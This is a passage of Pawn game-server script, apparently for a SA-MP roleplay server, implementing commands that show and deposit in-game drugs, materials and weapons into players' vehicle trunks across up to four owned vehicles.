		        format(string, sizeof(string), " Low Mats %d/2000 | Medium Mats %d/2000  | High Mats %d/2000", Player[playerid][pvLTMaterials], Player[playerid][pvMTMaterials], Player[playerid][pvHTMaterials]);
		        SendClientMessage(playerid, COLOR_WHITE, string);
		        format(string, sizeof(string), " Weapon 1: %s (%d Ammo) | Weapon 2: %s (%d Ammo)", RWN(Player[playerid][pTGun][0]), Player[playerid][pTGunAmmo][0], RWN(Player[playerid][pTGun][1]), Player[playerid][pTGunAmmo][1]);
				SendClientMessage(playerid, COLOR_WHITE, string);
				return 1;
		    }
			done = 1;
	    }
	    // third vehicle
	    GetVehiclePos(Player[playerid][pVVVeh], vx, vy, vz);
	    if(IsPlayerInRangeOfPoint(playerid, 4, vx, vy, vz))
	    {
	        if(sscanf(var, "s[32]", option))
		    {
		        SendClientMessage(playerid, COLOR_LIGHTBLUE, "___________________ [TRUNK] __________________");
		        format(string, sizeof(string), " %d/50G Weed | %d/50G Cocaine | %d/50 Seeds", Player[playerid][pvVTWeed], Player[playerid][pvVTCocaine], Player[playerid][pvVTWSeeds]);
		        SendClientMessage(playerid, COLOR_WHITE, string);
		        format(string, sizeof(string), " Low Mats %d/2000 | Medium Mats %d/2000  | High Mats %d/2000", Player[playerid][pvvLTMaterials], Player[playerid][pvvMTMaterials], Player[playerid][pvvHTMaterials]);
		        SendClientMessage(playerid, COLOR_WHITE, string);
		        format(string, sizeof(string), " Weapon 1: %s (%d Ammo) | Weapon 2: %s (%d Ammo)", RWN(Player[playerid][pTGun][0]), Player[playerid][pTGunAmmo][0], RWN(Player[playerid][pTGun][1]), Player[playerid][pTGunAmmo][1]);
				SendClientMessage(playerid, COLOR_WHITE, string);
				return 1;
		    }
			done = 1;
	    }
	    // fourth vehicle
	    GetVehiclePos(Player[playerid][pVVVVeh], vx, vy, vz);
	    if(IsPlayerInRangeOfPoint(playerid, 4, vx, vy, vz))
	    {
	        if(sscanf(var, "s[32]", option))
		    {
		        SendClientMessage(playerid, COLOR_LIGHTBLUE, "___________________ [TRUNK] __________________");
		        format(string, sizeof(string), " %d/50G Weed | %d/50G Cocaine | %d/50 Seeds", Player[playerid][pvVVTWeed], Player[playerid][pvVVTCocaine], Player[playerid][pvVVTWSeeds]);
		        SendClientMessage(playerid, COLOR_WHITE, string);
		        format(string, sizeof(string), " Low Mats %d/2000 | Medium Mats %d/2000  | High Mats %d/2000", Player[playerid][pvvvLTMaterials], Player[playerid][pvvvMTMaterials], Player[playerid][pvvvHTMaterials]);
		        SendClientMessage(playerid, COLOR_WHITE, string);
		        format(string, sizeof(string), " Weapon 1: %s (%d Ammo) | Weapon 2: %s (%d Ammo)", RWN(Player[playerid][pTGun][0]), Player[playerid][pTGunAmmo][0], RWN(Player[playerid][pTGun][1]), Player[playerid][pTGunAmmo][1]);
				SendClientMessage(playerid, COLOR_WHITE, string);
				return 1;
		    }
			done = 1;
	    }
	    if(!done) SendClientMessage(playerid, COLOR_GRAD2, "You are not near a vehicle you own.");
	}
	else
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You don't own any vehicle.");
	    return 1;
	}
    return 1;
}
IRP:tdeposit(playerid, var[])
{
	new string[128] ,option[32], amount, done;
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(topened[playerid] == 0) return SendClientMessage(playerid, COLOR_GRAD2, "You need to open your trunk first.");
   	if(Player[playerid][pVeh] || Player[playerid][pVVeh] || Player[playerid][pVVVeh] || Player[playerid][pVVVVeh])
    {
        new Float:vx, Float:vy, Float:vz;
	    GetVehiclePos(Player[playerid][pVeh], vx, vy, vz);
	    if(IsPlayerInRangeOfPoint(playerid, 4, vx, vy, vz))
	    {
	        if(sscanf(var, "s[32]", option))
		    {
		        SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /tdeposit [item]");
        		SendClientMessage(playerid, COLOR_GRAD2, "Weapon | Weed | Cocaine | lowmats | mediummats | highmats | Seeds");
        		return 1;
		    }
		    else if(!strcmp(option, "weed", true, 4))
			{
				if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /tdeposit weed [amount]");
				if(Player[playerid][pTWeed] > 50) return SendClientMessage(playerid, COLOR_GRAD2, "Your trunk can't carry anymore weed.");
				if(amount > 50) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much weed at once.");
				if(amount <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much weed at once.");
				if(Player[playerid][pWeed] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much weed on you.");
				Player[playerid][pTWeed] += amount;
				Player[playerid][pWeed] -= amount;
				format(string, sizeof(string), "* %s opens their vehicles trunk and puts %d grams of weed inside it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			}
			else if(!strcmp(option, "cocaine", true, 4))
			{
				if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /tdeposit deposit cocaine [amount]");
				if(Player[playerid][pTCocaine] > 50) return SendClientMessage(playerid, COLOR_GRAD2, "Your trunk can't carry anymore crack.");
				if(amount <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much cocaine at once.");
				if(amount > 50) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much cocaine at once.");
				if(Player[playerid][pCocaine] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much cocaine on you.");
				Player[playerid][pTCocaine] += amount;
				Player[playerid][pCocaine] -= amount;
				format(string, sizeof(string), "* %s opens their trunk and puts %d grams of cocaine inside it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			}
			else if(!strcmp(option, "lowmats", true, 4))
			{
				if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /tdeposit deposit lowmats [amount]");
				if(Player[playerid][pLTMaterials] > 2000) return SendClientMessage(playerid, COLOR_GRAD2, "Your trunk can't carry anymore low materials.");
				if(amount > 50) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much low materials at once.");
				if(amount <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much low materials at once.");
				if(Player[playerid][pLMaterials] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much low materials on you.");
				Player[playerid][pLTMaterials] += amount;
				Player[playerid][pLMaterials] -= amount;
				format(string, sizeof(string), "* %s opens their trunk and puts %d of low materials inside it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			}
			else if(!strcmp(option, "mediummats", true, 4))
			{
				if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /tdeposit deposit mediummats [amount]");
				if(Player[playerid][pMTMaterials] > 2000) return SendClientMessage(playerid, COLOR_GRAD2, "Your trunk can't carry anymore medium materials.");
				if(amount > 50) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much medium materials at once.");
				if(amount <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much medium materials at once.");
				if(Player[playerid][pMMaterials] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much medium materials on you.");
				Player[playerid][pMTMaterials] += amount;
				Player[playerid][pMMaterials] -= amount;
				format(string, sizeof(string), "* %s opens their trunk and puts %d of medium materials inside it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			}
			else if(!strcmp(option, "highmats", true, 4))
			{
				if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /tdeposit deposit highmats [amount]");
				if(Player[playerid][pHTMaterials] > 2000) return SendClientMessage(playerid, COLOR_GRAD2, "Your trunk can't carry anymore high materials.");
				if(amount > 50) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much high materials at once.");
				if(amount <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much high materials at once.");
				if(Player[playerid][pHMaterials] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much high materials on you.");
				Player[playerid][pHTMaterials] += amount;
				Player[playerid][pHMaterials] -= amount;
				format(string, sizeof(string), "* %s opens their trunk and puts %d of high materials inside it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			}
		    else if(!strcmp(option, "seeds", true, 4))
			{
				if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /tdeposit seeds [amount]");
				if(Player[playerid][pTWSeeds] > 50) return SendClientMessage(playerid, COLOR_GRAD2, "Your trunk can't carry anymore seeds.");
				if(amount > 50) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much seeds at once.");
				if(amount <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much seeds at once.");
				if(Player[playerid][pSeeds] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much seeds on you.");
				Player[playerid][pTWSeeds] += amount;
				Player[playerid][pSeeds] -= amount;
				format(string, sizeof(string), "* %s opens their vehicles trunk and puts %d seeds inside it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			}
			else if(!strcmp(option, "weapon", true, 4))
			{
				if(!GetPlayerWeapon(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not holding a weapon in your hand.");
				new tw[2], w[2];
				for(new i=0; i<13; i++)
				{
		 			GetPlayerWeaponData(playerid, i, tw[0], tw[1]);
					if(tw[0] == GetPlayerWeapon(playerid))
					{
						w[0] = tw[0];
						w[1] = tw[1];
					}
				}
				if(!Player[playerid][pTGun][0])
				{
					Player[playerid][pTGun][0] = w[0];
					Player[playerid][pTGunAmmo][0] = w[1];
					done = 1;
				}
				else if(!Player[playerid][pTGun][1])
				{
					Player[playerid][pTGun][1] = w[0];
					Player[playerid][pTGunAmmo][1] = w[1];
					done = 1;
				}
				if(done)
				{
					format(string, sizeof(string), "* %s puts a %s inside their trunk.", GetName(playerid), RWN(GetPlayerWeapon(playerid)));
					SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
					RemoveZamoraWeapon(playerid, w[0]);
				}
				else SendClientMessage(playerid, COLOR_GRAD2, "Your trunk can't contain any more weapons.");
			}
			done = 1;
	    }
	    // Second Vehicle
	    new Float:vvx, Float:vvy, Float:vvz;
	    GetVehiclePos(Player[playerid][pVVeh], vvx, vvy, vvz);
	    if(IsPlayerInRangeOfPoint(playerid, 4, vvx, vvy, vvz))
	    {
	        if(sscanf(var, "s[32]", option))
		    {
		        SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /tdeposit [item]");
        		SendClientMessage(playerid, COLOR_GRAD2, "Weapon | Weed | Cocaine | Material");
        		return 1;
		    }
		    else if(!strcmp(option, "weed", true, 4))
			{
				if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /tdeposit weed [amount]");
				if(Player[playerid][pvTWeed] > 50) return SendClientMessage(playerid, COLOR_GRAD2, "Your trunk can't carry anymore weed.");
				if(amount > 50) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much weed at once.");
				if(amount <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much weed at once.");
				if(Player[playerid][pWeed] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much weed on you.");
				Player[playerid][pvTWeed] += amount;
				Player[playerid][pWeed] -= amount;
				format(string, sizeof(string), "* %s opens their vehicles trunk and puts %d grams of weed inside it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			}
			else if(!strcmp(option, "cocaine", true, 4))
			{
				if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /tdeposit deposit cocaine [amount]");
				if(Player[playerid][pvTCocaine] > 50) return SendClientMessage(playerid, COLOR_GRAD2, "Your trunk can't carry anymore crack.");
				if(amount <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much cocaine at once.");
				if(amount > 50) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much cocaine at once.");
				if(Player[playerid][pCocaine] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much cocaine on you.");
				Player[playerid][pvTCocaine] += amount;
				Player[playerid][pCocaine] -= amount;
				format(string, sizeof(string), "* %s opens their trunk and puts %d grams of cocaine inside it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			}
			else if(!strcmp(option, "lowmats", true, 4))
			{
				if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /tdeposit deposit lowmats [amount]");
				if(Player[playerid][pvLTMaterials] > 2000) return SendClientMessage(playerid, COLOR_GRAD2, "Your trunk can't carry anymore low materials.");
				if(amount > 50) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much low materials at once.");
				if(amount <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much low materials at once.");
				if(Player[playerid][pLMaterials] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much low materials on you.");
				Player[playerid][pvLTMaterials] += amount;
				Player[playerid][pLMaterials] -= amount;
				format(string, sizeof(string), "* %s opens their trunk and puts %d of low materials inside it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			}
			else if(!strcmp(option, "mediummats", true, 4))
			{
				if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /tdeposit deposit mediummats [amount]");
				if(Player[playerid][pvMTMaterials] > 2000) return SendClientMessage(playerid, COLOR_GRAD2, "Your trunk can't carry anymore medium materials.");
				if(amount > 50) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much medium materials at once.");
				if(amount <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much medium materials at once.");
				if(Player[playerid][pMMaterials] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much medium materials on you.");
				Player[playerid][pvMTMaterials] += amount;
				Player[playerid][pMMaterials] -= amount;
				format(string, sizeof(string), "* %s opens their trunk and puts %d of medium materials inside it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			}
			else if(!strcmp(option, "highmats", true, 4))
			{
				if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /tdeposit deposit highmats [amount]");
				if(Player[playerid][pvHTMaterials] > 2000) return SendClientMessage(playerid, COLOR_GRAD2, "Your trunk can't carry anymore high materials.");
				if(amount > 50) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much high materials at once.");
				if(amount <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much high materials at once.");
				if(Player[playerid][pHMaterials] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much high materials on you.");
				Player[playerid][pvHTMaterials] += amount;
				Player[playerid][pHMaterials] -= amount;
				format(string, sizeof(string), "* %s opens their trunk and puts %d of high materials inside it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			}
		    else if(!strcmp(option, "seeds", true, 4))
			{
				if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /tdeposit seeds [amount]");
				if(Player[playerid][pvTWSeeds] > 50) return SendClientMessage(playerid, COLOR_GRAD2, "Your trunk can't carry anymore seeds.");
				if(amount > 50) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much seeds at once.");
				if(amount <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much seeds at once.");
				if(Player[playerid][pSeeds] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much seeds on you.");
				Player[playerid][pvTWSeeds] += amount;
				Player[playerid][pSeeds] -= amount;
				format(string, sizeof(string), "* %s opens their vehicles trunk and puts %d seeds inside it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			}
			else if(!strcmp(option, "weapon", true, 4))
			{
				if(!GetPlayerWeapon(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not holding a weapon in your hand.");
				new tw[2], w[2];
				for(new i=0; i<13; i++)
				{
		 			GetPlayerWeaponData(playerid, i, tw[0], tw[1]);
					if(tw[0] == GetPlayerWeapon(playerid))
					{
						w[0] = tw[0];
						w[1] = tw[1];
					}
				}
				if(!Player[playerid][pvTGun][0])
				{
					Player[playerid][pvTGun][0] = w[0];
					Player[playerid][pvTGunAmmo][0] = w[1];
					done = 1;
				}
				else if(!Player[playerid][pvTGun][1])
				{
					Player[playerid][pvTGun][1] = w[0];
					Player[playerid][pvTGunAmmo][1] = w[1];
					done = 1;
				}
				if(done)
				{
					format(string, sizeof(string), "* %s puts a %s inside their trunk.", GetName(playerid), RWN(GetPlayerWeapon(playerid)));
					SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
					RemoveZamoraWeapon(playerid, w[0]);
				}
				else SendClientMessage(playerid, COLOR_GRAD2, "Your trunk can't contain any more weapons.");
			}
			done = 1;
	    }
	    // Third Vehicle
        new Float:vvvx, Float:vvvy, Float:vvvz;
	    GetVehiclePos(Player[playerid][pVVVeh], vvvx, vvvy, vvvz);
	    if(IsPlayerInRangeOfPoint(playerid, 4, vvvx, vvvy, vvvz))
	    {
	        if(sscanf(var, "s[32]", option))
		    {
		        SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /tdeposit [item]");
        		SendClientMessage(playerid, COLOR_GRAD2, "Weapon | Weed | Cocaine | Material");
        		return 1;
		    }
		    else if(!strcmp(option, "weed", true, 4))
			{
				if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /tdeposit weed [amount]");
				if(Player[playerid][pvVTWeed] > 50) return SendClientMessage(playerid, COLOR_GRAD2, "Your trunk can't carry anymore weed.");
				if(amount > 50) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much weed at once.");
				if(amount <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much weed at once.");
				if(Player[playerid][pWeed] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much weed on you.");
				Player[playerid][pvVTWeed] += amount;
				Player[playerid][pWeed] -= amount;
				format(string, sizeof(string), "* %s opens their vehicles trunk and puts %d grams of weed inside it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			}
			else if(!strcmp(option, "cocaine", true, 4))
			{
				if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /tdeposit deposit cocaine [amount]");
				if(Player[playerid][pvVTCocaine] > 50) return SendClientMessage(playerid, COLOR_GRAD2, "Your trunk can't carry anymore crack.");
				if(amount <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much cocaine at once.");
				if(amount > 50) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much cocaine at once.");
				if(Player[playerid][pCocaine] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much cocaine on you.");
				Player[playerid][pvVTCocaine] += amount;
				Player[playerid][pCocaine] -= amount;
				format(string, sizeof(string), "* %s opens their trunk and puts %d grams of cocaine inside it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			}
			else if(!strcmp(option, "lowmats", true, 4))
			{
				if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /tdeposit deposit lowmats [amount]");
				if(Player[playerid][pvvLTMaterials] > 2000) return SendClientMessage(playerid, COLOR_GRAD2, "Your trunk can't carry anymore low materials.");
				if(amount > 50) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much low materials at once.");
				if(amount <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much low materials at once.");
				if(Player[playerid][pLMaterials] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much low materials on you.");
				Player[playerid][pvvLTMaterials] += amount;
				Player[playerid][pLMaterials] -= amount;
				format(string, sizeof(string), "* %s opens their trunk and puts %d of low materials inside it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			}
			else if(!strcmp(option, "mediummats", true, 4))
			{
				if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /tdeposit deposit mediummats [amount]");
				if(Player[playerid][pvvMTMaterials] > 2000) return SendClientMessage(playerid, COLOR_GRAD2, "Your trunk can't carry anymore medium materials.");
				if(amount > 50) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much medium materials at once.");
				if(amount <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much medium materials at once.");
				if(Player[playerid][pMMaterials] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much medium materials on you.");
				Player[playerid][pvvMTMaterials] += amount;
				Player[playerid][pMMaterials] -= amount;
				format(string, sizeof(string), "* %s opens their trunk and puts %d of medium materials inside it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			}
			else if(!strcmp(option, "highmats", true, 4))
			{
				if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /tdeposit deposit highmats [amount]");
				if(Player[playerid][pvvHTMaterials] > 2000) return SendClientMessage(playerid, COLOR_GRAD2, "Your trunk can't carry anymore high materials.");
				if(amount > 50) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much high materials at once.");
				if(amount <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much high materials at once.");
				if(Player[playerid][pHMaterials] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much high materials on you.");
				Player[playerid][pvvHTMaterials] += amount;
				Player[playerid][pHMaterials] -= amount;
				format(string, sizeof(string), "* %s opens their trunk and puts %d of high materials inside it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			}
		    else if(!strcmp(option, "seeds", true, 4))
			{
				if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /tdeposit seeds [amount]");
				if(Player[playerid][pvVTWSeeds] > 50) return SendClientMessage(playerid, COLOR_GRAD2, "Your trunk can't carry anymore seeds.");
				if(amount > 50) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much seeds at once.");
				if(amount <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much seeds at once.");
				if(Player[playerid][pSeeds] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much seeds on you.");
				Player[playerid][pvVTWSeeds] += amount;
				Player[playerid][pSeeds] -= amount;
				format(string, sizeof(string), "* %s opens their vehicles trunk and puts %d seeds inside it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			}
			else if(!strcmp(option, "weapon", true, 4))
			{
				if(!GetPlayerWeapon(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not holding a weapon in your hand.");
				new tw[2], w[2];
				for(new i=0; i<13; i++)
				{
		 			GetPlayerWeaponData(playerid, i, tw[0], tw[1]);
					if(tw[0] == GetPlayerWeapon(playerid))
					{
						w[0] = tw[0];
						w[1] = tw[1];
					}
				}
				if(!Player[playerid][pvVTGun][0])
				{
					Player[playerid][pvVTGun][0] = w[0];
					Player[playerid][pvVTGunAmmo][0] = w[1];
					done = 1;
				}
				else if(!Player[playerid][pvVTGun][1])
				{
					Player[playerid][pvVTGun][1] = w[0];
					Player[playerid][pvVTGunAmmo][1] = w[1];
					done = 1;
				}
				if(done)
				{
					format(string, sizeof(string), "* %s puts a %s inside their trunk.", GetName(playerid), RWN(GetPlayerWeapon(playerid)));
					SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
					RemoveZamoraWeapon(playerid, w[0]);
				}
				else SendClientMessage(playerid, COLOR_GRAD2, "Your trunk can't contain any more weapons.");
			}
			done = 1;
	    }
	    // Fourth Vehicle
	    new Float:vvvvx, Float:vvvvy, Float:vvvvz;
	    GetVehiclePos(Player[playerid][pVVVVeh], vvvvx, vvvvy, vvvvz);
	    if(IsPlayerInRangeOfPoint(playerid, 4, vvvvx, vvvvy, vvvvz))
	    {
	        if(sscanf(var, "s[32]", option))
		    {
		        SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /tdeposit [item]");
        		SendClientMessage(playerid, COLOR_GRAD2, "Weapon | Weed | Cocaine | Material");
        		return 1;
		    }
		    else if(!strcmp(option, "weed", true, 4))
			{
				if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /tdeposit weed [amount]");
				if(Player[playerid][pvVVTWeed] > 50) return SendClientMessage(playerid, COLOR_GRAD2, "Your trunk can't carry anymore weed.");
				if(amount > 50) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much weed at once.");
				if(amount <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much weed at once.");
				if(Player[playerid][pWeed] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much weed on you.");
				Player[playerid][pvVVTWeed] += amount;
				Player[playerid][pWeed] -= amount;
				format(string, sizeof(string), "* %s opens their vehicles trunk and puts %d grams of weed inside it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			}
			else if(!strcmp(option, "cocaine", true, 4))
			{
				if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /tdeposit deposit cocaine [amount]");
				if(Player[playerid][pvVVTCocaine] > 50) return SendClientMessage(playerid, COLOR_GRAD2, "Your trunk can't carry anymore crack.");
				if(amount <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much cocaine at once.");
				if(amount > 50) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much cocaine at once.");
				if(Player[playerid][pCocaine] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much cocaine on you.");
				Player[playerid][pvVVTCocaine] += amount;
				Player[playerid][pCocaine] -= amount;
				format(string, sizeof(string), "* %s opens their trunk and puts %d grams of cocaine inside it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			}
			else if(!strcmp(option, "lowmats", true, 4))
			{
				if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /tdeposit deposit lowmats [amount]");
				if(Player[playerid][pvvvLTMaterials] > 2000) return SendClientMessage(playerid, COLOR_GRAD2, "Your trunk can't carry anymore low materials.");
				if(amount > 50) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much low materials at once.");
				if(amount <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "You can't store that much low materials at once.");
				if(Player[playerid][pLMaterials] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much low materials on you.");
				Player[playerid][pvvvLTMaterials] += amount;
				Player[playerid][pLMaterials] -= amount;
				format(string, sizeof(string), "* %s opens their trunk and puts %d of low materials inside it.", GetName(playerid), amount);
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			}
			else if(!strcmp(option, "mediummats", true, 4))
			{
				if(sscanf(var, "s[32]i", option, amount)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /tdeposit deposit mediummats [amount]");
